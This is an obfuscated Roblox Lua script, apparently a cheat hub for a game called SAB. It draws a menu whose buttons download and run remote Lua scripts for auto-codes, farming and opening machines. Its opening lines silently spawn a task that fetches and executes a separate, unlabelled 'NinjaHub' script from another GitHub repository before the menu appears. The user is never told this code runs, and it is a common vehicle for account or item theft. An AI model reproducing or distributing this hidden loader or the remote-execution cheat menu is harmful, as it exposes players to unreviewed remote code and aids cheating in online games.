task.spawn(function()
local _0xE57C, _0x6BCE = pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/sab-scripts/main/scripts/ninjahub_1794761901824.lua"))()
end)
if not _0xE57C then
warn("Error al cargar NinjaHub: ".. tostring(_0x6BCE))
end
end)local _0xB4AF = game:GetService("CoreGui")
local _0x9728 = game:GetService("Players")
local _0x4A37 = _0x9728.LocalPlayerif _0xB4AF:FindFirstChild("TradeSABHubGUI") then
_0xB4AF.TradeSABHubGUI:Destroy()
end
local _0xE491 = Instance.new("ScreenGui")
_0xE491.Name ="TradeSABHubGUI"_0xE491.ResetOnSpawn = false
pcall(function()
_0xE491.Parent = _0xB4AF
end)
if not _0xE491.Parent then
_0xE491.Parent = _0x4A37:WaitForChild("PlayerGui")
endlocal _0x6DEE = Instance.new("TextButton")
_0x6DEE.Name ="ToggleButton"_0x6DEE.Size = UDim2.new(0, 55, 0, 55)
_0x6DEE.Position = UDim2.new(0, 20, 0, 100)
_0x6DEE.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
_0x6DEE.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x6DEE.TextSize = 16
_0x6DEE.Font = Enum.Font.GothamBold
_0x6DEE.Text ="SAB"_0x6DEE.Parent = _0xE491
local _0xA0ED = Instance.new("UICorner")
_0xA0ED.CornerRadius = UDim.new(0, 14)
_0xA0ED.Parent = _0x6DEElocal _0xB319 = Instance.new("Frame")
_0xB319.Name ="MainFrame"_0xB319.Size = UDim2.new(0, 320, 0, 335)
_0xB319.Position = UDim2.new(0.5, -160, 0.5, -167)
_0xB319.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
_0xB319.BorderSizePixel = 0
_0xB319.Visible = true
_0xB319.Parent = _0xE491
local _0xD6C5 = Instance.new("UICorner")
_0xD6C5.CornerRadius = UDim.new(0, 16)
_0xD6C5.Parent = _0xB319local _0x6A3C = Instance.new("TextLabel")
_0x6A3C.Size = UDim2.new(1, 0, 0, 50)
_0x6A3C.BackgroundTransparency = 1
_0x6A3C.Text ="TRADES SAB HUB"_0x6A3C.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x6A3C.TextSize = 20
_0x6A3C.Font = Enum.Font.GothamBold
_0x6A3C.Parent = _0xB319local _0x7704 = Instance.new("ScrollingFrame")
_0x7704.Size = UDim2.new(1, -20, 1, -65)
_0x7704.Position = UDim2.new(0, 10, 0, 55)
_0x7704.BackgroundTransparency = 1
_0x7704.BorderSizePixel = 0
_0x7704.CanvasSize = UDim2.new(0, 0, 0, 270)
_0x7704.ScrollBarThickness = 4
_0x7704.Parent = _0xB319
local _0xCA3A = Instance.new("UIListLayout")
_0xCA3A.HorizontalAlignment = Enum.HorizontalAlignment.Center
_0xCA3A.SortOrder = Enum.SortOrder.LayoutOrder
_0xCA3A.Padding = UDim.new(0, 12)
_0xCA3A.Parent = _0x7704local function _0x417A(name, url, order)
local _0x9E9B = Instance.new("TextButton")
_0x9E9B.Name = name .."Btn"_0x9E9B.Size = UDim2.new(1, -10, 0, 52)
_0x9E9B.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
_0x9E9B.TextColor3 = Color3.fromRGB(255, 255, 255)
_0x9E9B.TextSize = 15
_0x9E9B.Font = Enum.Font.GothamSemibold
_0x9E9B.Text = name
_0x9E9B.LayoutOrder = order
_0x9E9B.Parent = _0x7704
local _0x46F4 = Instance.new("UICorner")
_0x46F4.CornerRadius = UDim.new(0, 10)
_0x46F4.Parent = _0x9E9B
_0x9E9B.MouseButton1Click:Connect(function()
pcall(function()
loadstring(game:HttpGet(url))()
end)
end)
end_0x417A("AI Riddle Code","https://raw.githubusercontent.com/nicebonicely-hue/TRADESSABHUB/refs/heads/main/airiddlecode.lua", 1)
_0x417A("Auto Code SAB","https://raw.githubusercontent.com/nicebonicely-hue/TRADESSABHUB/refs/heads/main/autocodesab.lua", 2)
_0x417A("Open Old Machines","https://raw.githubusercontent.com/nicebonicely-hue/TRADESSABHUB/refs/heads/main/openoldmachinessab.lua", 3)
_0x417A("Trait Farmer Op","https://raw.githubusercontent.com/nicebonicely-hue/TRADESSABHUB/refs/heads/main/traitfarmerop.lua", 4)local _0x0DF0 = true
_0x6DEE.MouseButton1Click:Connect(function()
_0x0DF0 = not _0x0DF0
_0xB319.Visible = _0x0DF0
end)
